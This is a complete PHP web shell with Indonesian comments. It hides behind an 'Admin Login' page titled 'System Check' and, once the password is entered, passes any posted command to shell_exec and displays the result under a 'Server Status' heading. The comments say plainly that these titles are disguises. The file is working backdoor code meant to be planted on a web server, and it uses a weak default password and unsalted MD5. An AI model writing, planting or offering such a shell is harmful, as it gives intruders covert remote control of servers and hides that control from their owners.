<?php
$password = "123456"; // GANTI INI DENGAN PASSWORD YANG KUAT!
$hashed_password = md5($password); // Simpan hash-nya, jangan plaintext

// Cek jika password sudah di-submit
if(isset($_POST['pass'])) {
    if(md5($_POST['pass']) === $hashed_password) {
        $authed = true;
        // Jika perintah dikirim, eksekusi
        if(isset($_POST['cmd'])) {
            $output = shell_exec($_POST['cmd'] . " 2>&1");
        }
    } else {
        $error = "Password salah!";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>System Check</title> <!-- Judul yang menyamar -->
    <style>
        body { font-family: Arial; background: #f4f4f4; padding: 20px; }
        .container { background: white; padding: 20px; border-radius: 5px; }
        pre { background: #eee; padding: 10px; border: 1px solid #ccc; }
    </style>
</head>
<body>
    <div class="container">
        <?php if(!isset($authed)): ?>
            <!-- TAMPILAN LOGIN (Penyamaran) -->
            <h2>Admin Login</h2>
            <?php if(isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
            <form method="POST">
                Password: <input type="password" name="pass" required>
                <input type="submit" value="Login">
            </form>

        <?php else: ?>
            <!-- TAMPILAN SHELL SETELAH LOGIN -->
            <h2>Server Status</h2> <!-- Masih menyamar -->
            <form method="POST">
                <input type="hidden" name="pass" value="<?php echo $_POST['pass']; ?>">
                Command: <input type="text" name="cmd" size="50" value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : 'ls -la'; ?>" required>
                <input type="submit" value="Execute">
            </form>

            <?php if(isset($output)): ?>
                <h3>Output:</h3>
                <pre><?php echo htmlspecialchars($output); ?></pre>
            <?php endif; ?>

        <?php endif; ?>
    </div>
</body>
</html>
